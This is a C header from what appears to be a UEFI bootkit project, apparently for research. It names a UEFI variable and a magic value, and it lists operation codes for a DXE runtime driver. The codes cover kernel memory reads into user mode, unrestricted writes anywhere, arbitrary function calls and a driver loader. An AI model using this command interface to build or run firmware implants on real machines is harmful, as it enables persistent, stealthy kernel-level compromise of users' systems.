// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



#ifndef GLOBALS01OPERATIONS_H
#define GLOBALS01OPERATIONS_H



// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------
// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------



#define MACRO_GLOBALSOPERATIONS_VARIABLE_NAME L"Abyss_TheMalwareGuardian_Benthic_drkrysSrng"
#define MACRO_GLOBALSOPERATIONS_COMMAND_MAGIC 0xBADC0DE



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



// Operation codes supported by Bootkit2_Runtime_DXERuntimeDriver. Keep this list synchronized with the driver to ensure compatibility.
typedef enum _GLOBALS_OPERATIONS_COMMANDID
{
	// 100-series -> status
	GLOBALS_OPERATIONS_COMMANDID_OP_DRIVER_PRESENCE      = 100, // Echo "DXE Runtime Driver is alive"
	GLOBALS_OPERATIONS_COMMANDID_OP_GET_BUFFER_BOUNDS    = 101, // Return start/end of internal buffer

	// 200-series  ->  read
	GLOBALS_OPERATIONS_COMMANDID_OP_READ_MEMORY          = 200, // Copy kernel to user

	// 300-series  ->  write
	GLOBALS_OPERATIONS_COMMANDID_OP_WRITE_TAG            = 300, // Write predefined tag at offset 0
	GLOBALS_OPERATIONS_COMMANDID_OP_WRITE_IN_BUFFER      = 301, // Bounds-checked write into buffer
	GLOBALS_OPERATIONS_COMMANDID_OP_WRITE_RAW            = 302, // Unrestricted write anywhere

	// 400-series  ->  call
	GLOBALS_OPERATIONS_COMMANDID_OP_CALL_FAST            = 400, // Fastcall function pointer

	// 500-series  -> driver loader
	GLOBALS_OPERATIONS_COMMANDID_OP_DRIVER_ENTRY         = 500, // Invoke DriverEntry(fakeObj, regPath)

	/* Extend here … */
} GLOBALS_OPERATIONS_COMMANDID;



#endif // GLOBALS01OPERATIONS_H



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
